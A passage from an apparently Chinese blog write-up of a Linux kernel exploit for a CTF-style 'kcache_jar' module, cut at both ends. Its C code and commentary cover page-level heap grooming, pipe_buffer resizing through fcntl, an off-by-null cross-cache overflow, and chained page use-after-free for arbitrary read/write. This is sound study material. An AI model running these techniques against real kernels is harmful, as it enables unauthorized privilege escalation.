page</code>进而操作在同一个物理页上</p><p>不过考虑到page字段的最低处本身就有<code>1/4</code>的概率是<code>\x00</code>,所以只有<code>3/4</code>的概率能够成功劫持</p><p>我们暂且不考虑做到这一步的细节,继续向下思考</p><p>现在我们有了两个能够操控相同物理页的pipe,很自然的一个思路便是UAF泄露信息然后劫持结构体函数指针</p><p>但别忘了内核开启了CFI,也就是说这种方法并不适用,那在这种情况下要想提权就必须要具备一定程度的读写能力</p><p><code>arttnba3</code>大佬给出了一个十分巧妙的办法,即释放其中一个pipe,让这个uaf的页继续作为<code>pipe_buffer</code>的slab页</p><p>此时我们可以用另一个pipe读出uaf页内部的信息,这其中就包含着完整的page指针,如果我们再拿这个page指针去覆盖uaf页上下一个<code>pipe_buffer</code>结构体,岂不是又构造了一次uaf</p><p>接着我们再释放这两个pipe中的一个,并再次将该页作为<code>pipe_buffer</code>的slab页</p><p>与上一次uaf不同的是,这一次uaf我们是知道这个uaf页的<code>struct page*</code>指针的,那么我们岂不是可以直接修改这个uaf页上的pipe_buffer的page指针为本uaf页的page指针</p><p>从而使得这一次uaf页上的pipe_buffer指向自身</p><p>之后多修改几个这样的指针让其互相重置岂不是可以任意读写,再提权不是十分简单</p><h2 id="思路实现"><a href="#思路实现" class="headerlink" title="思路实现"></a>思路实现</h2><p>以上理了一遍思路,现在开始分析如何实现</p><h3 id="页级堆风水构造"><a href="#页级堆风水构造" class="headerlink" title="页级堆风水构造"></a>页级堆风水构造</h3><p>此前已经学习过利用setsockopt来构造堆风水</p><p>此处不再赘述</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">~ $ <span class="built_in">cat</span> /proc/buddyinfo </span><br><span class="line">Node 0, zone      DMA      0      0      0      0      0      1      1      1      0      1     </span><br><span class="line">Node 0, zone    DMA32      1      2      1      2      4      1      2      2      6      2    </span><br></pre></td></tr></table></figure><p>我们可以看到,内核刚启动时伙伴系统算是比较干净的</p><p>低阶的连续页较少,次数不多的setsockopt便能够清空低阶的连续页</p><p>也就是对应exp中的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* spray pages in different size for various usages */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">prepare_pgv_pages</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * We want a more clear and continuous memory there, which require us to </span></span><br><span class="line"><span class="comment">     * make the noise less in allocating order-3 pages.</span></span><br><span class="line"><span class="comment">     * So we pre-allocate the pages for those noisy objects there.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] spray pgv order-0 pages...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PGV_1PAGE_SPRAY_NUM; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (alloc_page(i, <span class="number">0x1000</span>, <span class="number">1</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[x] failed to create %d socket for pages spraying!\n&quot;</span>, i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] spray pgv order-2 pages...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PGV_4PAGES_SPRAY_NUM; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (alloc_page(PGV_4PAGES_START_IDX + i, <span class="number">0x1000</span> * <span class="number">4</span>, <span class="number">1</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[x] failed to create %d socket for pages spraying!\n&quot;</span>, i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* spray 8 pages for page-level heap fengshui */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] spray pgv order-3 pages...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PGV_8PAGES_SPRAY_NUM; i++) &#123;</span><br><span class="line">        <span class="comment">/* a socket need 1 obj: sock_inode_cache, 19 objs for 1 slub on 4 page*/</span></span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">19</span> == <span class="number">0</span>) &#123;</span><br><span class="line">            free_page(pgv_4pages_start_idx++);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* a socket need 1 dentry: dentry, 21 objs for 1 slub on 1 page */</span></span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">21</span> == <span class="number">0</span>) &#123;</span><br><span class="line">            free_page(pgv_1page_start_idx += <span class="number">2</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* a pgv need 1 obj: kmalloc-8, 512 objs for 1 slub on 1 page*/</span></span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">512</span> == <span class="number">0</span>) &#123;</span><br><span class="line">            free_page(pgv_1page_start_idx += <span class="number">2</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (alloc_page(PGV_8PAGES_START_IDX + i, <span class="number">0x1000</span> * <span class="number">8</span>, <span class="number">1</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[x] failed to create %d socket for pages spraying!\n&quot;</span>, i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使得之后分配的页都是高阶拆分下来的连续页,之所以后面还要隔几个释放一个,是因为socket产生的噪声,为了尽量避免其拆散高阶连续页,所以释放之前申请的给其使用</p><p>现在面临的一个问题是</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># name            &lt;active_objs&gt; &lt;num_objs&gt; &lt;objsize&gt; &lt;objperslab&gt; &lt;pagesperslab&gt; : tunables &lt;li&gt;</span></span><br><span class="line">kcache_jar            16     16   2048   16    8 : tunables    0    0    0 : slabdata      1   0</span><br><span class="line">kmalloc-cg-1k         94    160   1024   16    4 : tunables    0    0    0 : slabdata     10   0</span><br><span class="line">dma-kmalloc-4k         0      0   4096    8    8 : tunables    0    0    0 : slabdata      0   0</span><br></pre></td></tr></table></figure><p>页级堆风水要保证成功率,最好是向同一个order申请</p><p><code>kcache_jar</code>所在的分配器每一次申请slab都是申请8页也就是order3</p><p>而<code>pipe_buffer</code>默认创建16个大小是<code>640</code>是向<code>kmalloc-cg-1k</code>申请,并在耗尽时向order2申请</p><p>但要想保证较高的成功率,我们需要想办法使得二者是向同阶的order申请,<code>kcache_jar</code>显然没法改</p><p>但<code>pipe_buffer</code>并不是改不了</p><p>fcntl提供了接口</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">long</span> <span class="title function_">pipe_fcntl</span><span class="params">(<span class="keyword">struct</span> file *file, <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> <span class="type">long</span> arg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> *<span class="title">pipe</span>;</span></span><br><span class="line">    <span class="type">long</span> ret;</span><br><span class="line"></span><br><span class="line">    pipe = get_pipe_info(file, <span class="literal">false</span>);</span><br><span class="line">    <span class="keyword">if</span> (!pipe)</span><br><span class="line">        <span class="keyword">return</span> -EBADF;</span><br><span class="line"></span><br><span class="line">    __pipe_lock(pipe);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (cmd) &#123;</span><br><span class="line">    <span class="keyword">case</span> F_SETPIPE_SZ:</span><br><span class="line">        ret = pipe_set_size(pipe, arg);</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">long</span> <span class="title function_">pipe_set_size</span><span class="params">(<span class="keyword">struct</span> pipe_inode_info *pipe, <span class="type">unsigned</span> <span class="type">long</span> arg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">    ret = pipe_resize_ring(pipe, nr_slots);</span><br><span class="line"></span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">pipe_resize_ring</span><span class="params">(<span class="keyword">struct</span> pipe_inode_info *pipe, <span class="type">unsigned</span> <span class="type">int</span> nr_slots)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">bufs</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> head, tail, mask, n;</span><br><span class="line"></span><br><span class="line">    bufs = kcalloc(nr_slots, <span class="keyword">sizeof</span>(*bufs),</span><br><span class="line">               GFP_KERNEL_ACCOUNT | __GFP_NOWARN);</span><br></pre></td></tr></table></figure><p>我们可以通过这个改变pipe_buffer申请obj的slab</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">extend_pipe_buffer_to_4k</span><span class="params">(<span class="type">int</span> start_idx, <span class="type">int</span> nr)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; nr; i++) &#123;</span><br><span class="line">        <span class="comment">/* let the pipe_buffer to be allocated on order-3 pages (kmalloc-4k) */</span></span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">8</span> == <span class="number">0</span>) &#123;</span><br><span class="line">            free_page(pgv_8pages_start_idx++);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* a pipe_buffer on 1k is for 16 pages, so 4k for 64 pages */</span></span><br><span class="line">        <span class="keyword">if</span> (fcntl(pipe_fd[start_idx + i][<span class="number">1</span>], F_SETPIPE_SZ, <span class="number">0x1000</span> * <span class="number">64</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[x] failed to extend %d pipe!\n&quot;</span>, start_idx + i);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>除此之外我们再选择将kcache_jar的slab夹在pipe_buffer的slab中间,以此来提高成功率</p><p>对应exp代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">corrupting_first_level_pipe_for_page_uaf</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x1000</span>];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] spray pipe_buffer...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUM; i ++) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (pipe(pipe_fd[i]) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[x] failed to alloc %d pipe!&quot;</span>, i);</span><br><span class="line">            err_exit(<span class="string">&quot;FAILED to create pipe!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* spray pipe_buffer on order-2 pages, make vul-obj slub around with that.*/</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] exetend pipe_buffer...&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (extend_pipe_buffer_to_4k(<span class="number">0</span>, PIPE_SPRAY_NUM / <span class="number">2</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;FAILED to extend pipe!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] spray vulnerable 2k obj...&quot;</span>);</span><br><span class="line">    free_page(pgv_8pages_start_idx++);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; KCACHE_NUM; i++) &#123;</span><br><span class="line">        kcache_alloc(i, <span class="number">8</span>, <span class="string">&quot;arttnba3&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] exetend pipe_buffer...&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (extend_pipe_buffer_to_4k(PIPE_SPRAY_NUM / <span class="number">2</span>, PIPE_SPRAY_NUM / <span class="number">2</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;FAILED to extend pipe!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    .......</span><br><span class="line">    .......</span><br><span class="line">            <span class="comment">/* try to trigger cross-cache overflow */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] trigerring cross-cache off-by-null...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; KCACHE_NUM; i++) &#123;</span><br><span class="line">        kcache_append(i, KCACHE_SIZE - <span class="number">8</span>, buf);</span><br><span class="line">    &#125;</span><br><span class="line">    .......</span><br><span class="line">    .......</span><br></pre></td></tr></table></figure><p>至此<code>off-by-null</code>利用完成</p><h3 id="第一次uaf"><a href="#第一次uaf" class="headerlink" title="第一次uaf"></a>第一次uaf</h3><p>在上一步我们完成了<code>off-by-null</code>的利用</p><p>如果一切顺利,那么我们现在已经掌握了一个可以uaf的页</p><p>如何检测是否成功拿到了这个页呢</p><p>首先我们在触发<code>off-by-null</code>之前先向所有管道写入一些标识信息</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;[*] allocating pipe pages...&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUM; i++) &#123;</span><br><span class="line">    write(pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;arttnba3&quot;</span>, <span class="number">8</span>);</span><br><span class="line">    write(pipe_fd[i][<span class="number">1</span>], &amp;i, <span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">    write(pipe_fd[i][<span class="number">1</span>], &amp;i, <span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">    write(pipe_fd[i][<span class="number">1</span>], &amp;i, <span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">    write(pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;arttnba3&quot;</span>, <span class="number">8</span>);</span><br><span class="line">    write(pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;arttnba3&quot;</span>, <span class="number">8</span>);  <span class="comment">/* prevent pipe_release() */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么当<code>off-by-null</code>触发之后,如果我们再次遍历读取所有管道,如果一个管道发现其读取出的整型nr与当前游标i不同,那么我们就可以确认这个管道的pipe_buffer就是被<code>off-by-null</code>的那个</p><p>即<code>pipe[nr]</code>是被<code>off-by-null</code>的那个,<code>pipe[i]</code>是与其重叠那个原管道</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* checking for cross-cache overflow */</span></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;[*] checking for corruption...&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUM; i++) &#123;</span><br><span class="line">    <span class="type">char</span> a3_str[<span class="number">0x10</span>];</span><br><span class="line">    <span class="type">int</span> nr;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(a3_str, <span class="string">&#x27;\0&#x27;</span>, <span class="keyword">sizeof</span>(a3_str));</span><br><span class="line">    read(pipe_fd[i][<span class="number">0</span>], a3_str, <span class="number">8</span>);</span><br><span class="line">    read(pipe_fd[i][<span class="number">0</span>], &amp;nr, <span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(a3_str, <span class="string">&quot;arttnba3&quot;</span>) &amp;&amp; nr != i) &#123;</span><br><span class="line">        orig_pid = nr;</span><br><span class="line">        victim_pid = i;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found victim: \033[0m%d &quot;</span></span><br><span class="line">               <span class="string">&quot;\033[32m\033[1m, orig: \033[0m%d\n\n&quot;</span>, </span><br><span class="line">               victim_pid, orig_pid);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (victim_pid == <span class="number">-1</span>) &#123;</span><br><span class="line">    err_exit(<span class="string">&quot;FAILED to corrupt pipe_buffer!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>有人可能会好奇,为什么找到了victim后就直接break了,这样不是会有可能略过orig的读取,从而导致之后的读写不一致吗</p><p>这个因为其之后的操作都是基于victim的,所以不必担心</p><hr><p>不过还有一个疑问,就是一种极端情况</p><p>如果i=0时,就找到了victim,那么之后所有的pipe就都没进行读取,这样在第二次uaf的判断中,读取时不就会出现错误嘛</p><p>所以我个人认为可以就算找到了victim也不break,而是继续向下执行直到遍历完所有的pipe</p><p>当然其实必要性也不大,毕竟这个概率太小了,但我试了一下去除break其实确实是可行的</p><h3 id="第二次uaf"><a href="#第二次uaf" class="headerlink" title="第二次uaf"></a>第二次uaf</h3><p>现在我们已经有了一个可以uaf的页,并且可以读写上面的所有内容</p><p>我们首先释放这个uaf页,使其回到伙伴系统</p><p>之后再次利用fcntl修改剩余<code>pipe_buffer</code>的大小,使其重新分配,且刚好取出这个页作为slab</p><p>需要注意的是,因为之后还需要一次更改<code>pipe_buffer</code>大小,所以这次更改的大小要稍微讲究一些,即其所在slab是向order1申请内存,且objsize应该大于80,并刚好被2的幂次个pipe_buffer结构体选中作为obj</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kmalloc-cg-192       504    504    192   21    1 : tunables    0    0    0 : slabdata     24   0</span><br><span class="line">kmalloc-cg-96        252    252     96   42    1 : tunables    0    0    0 : slabdata      6   0</span><br></pre></td></tr></table></figure><p>我们选中这两个作为目标</p><p>所以此次我们需要修改的大小是<code>0x2000</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">corrupting_second_level_pipe_for_pipe_uaf</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">size_t</span> buf[<span class="number">0x1000</span>];</span><br><span class="line">    <span class="type">size_t</span> snd_pipe_sz = <span class="number">0x1000</span> * (SND_PIPE_BUF_SZ/<span class="keyword">sizeof</span>(<span class="keyword">struct</span> pipe_buffer));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="string">&#x27;\0&#x27;</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* let the page&#x27;s ptr at pipe_buffer */</span></span><br><span class="line">    write(pipe_fd[victim_pid][<span class="number">1</span>], buf, SND_PIPE_BUF_SZ*<span class="number">2</span> - <span class="number">24</span> - <span class="number">3</span>*<span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* free orignal pipe&#x27;s page */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] free original pipe...&quot;</span>);</span><br><span class="line">    close(pipe_fd[orig_pid][<span class="number">0</span>]);</span><br><span class="line">    close(pipe_fd[orig_pid][<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* try to rehit victim page by reallocating pipe_buffer */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] fcntl() to set the pipe_buffer on victim page...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUM; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (i == orig_pid || i == victim_pid) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (fcntl(pipe_fd[i][<span class="number">1</span>], F_SETPIPE_SZ, snd_pipe_sz) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[x] failed to resize %d pipe!\n&quot;</span>, i);</span><br><span class="line">            err_exit(<span class="string">&quot;FAILED to re-alloc pipe_buffer!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ....</span><br></pre></td></tr></table></figure><hr><p>在进一步解析之前先提一下<code>pipe_buffer</code>结构体中<code>offset</code>与<code>len</code>两个字段的作用</p><p><code>offset</code>指向未读取的数据偏移</p><p><code>len</code>代表未读取得数据得长度</p><p>也就是说</p><ul><li>对一个pipe进行read操作是从offset开始的,最多读取len长度</li><li>对一个pipe进行write操作是从offset+len处开始写起的</li></ul><p>因此我们可以看到exp中有很多用于平衡读写的操作</p><hr><p>继续exp的分析,在平衡好读写后,我们便可以读取到一个pipe_buffer的完整结构</p><p>然后我们再将其写到下一个pipe_buffer,这样我们又构造了一个uaf</p><p>之后用同样的办法找到目标管道</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* read victim page to check whether we&#x27;ve successfully hit it */</span></span><br><span class="line">read(pipe_fd[victim_pid][<span class="number">0</span>], buf, SND_PIPE_BUF_SZ - <span class="number">8</span> - <span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">read(pipe_fd[victim_pid][<span class="number">0</span>], &amp;info_pipe_buf, <span class="keyword">sizeof</span>(info_pipe_buf));</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[?] info_pipe_buf-&gt;page: \033[0m%p\n&quot;</span> </span><br><span class="line">       <span class="string">&quot;\033[34m\033[1m[?] info_pipe_buf-&gt;ops: \033[0m%p\n&quot;</span>, </span><br><span class="line">       info_pipe_buf.page, info_pipe_buf.ops);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((<span class="type">size_t</span>) info_pipe_buf.page &lt; <span class="number">0xffff000000000000</span></span><br><span class="line">    || (<span class="type">size_t</span>) info_pipe_buf.ops &lt; <span class="number">0xffffffff81000000</span>) &#123;</span><br><span class="line">    err_exit(<span class="string">&quot;FAILED to re-hit victim page!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;\033[32m\033[1m[+] Successfully to hit the UAF page!\033[0m&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Got page leak:\033[0m %p\n&quot;</span>, info_pipe_buf.page);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* construct a second-level page uaf */</span></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;[*] construct a second-level uaf pipe page...&quot;</span>);</span><br><span class="line">info_pipe_buf.page = (<span class="keyword">struct</span> page*) ((<span class="type">size_t</span>) info_pipe_buf.page + <span class="number">0x40</span>);</span><br><span 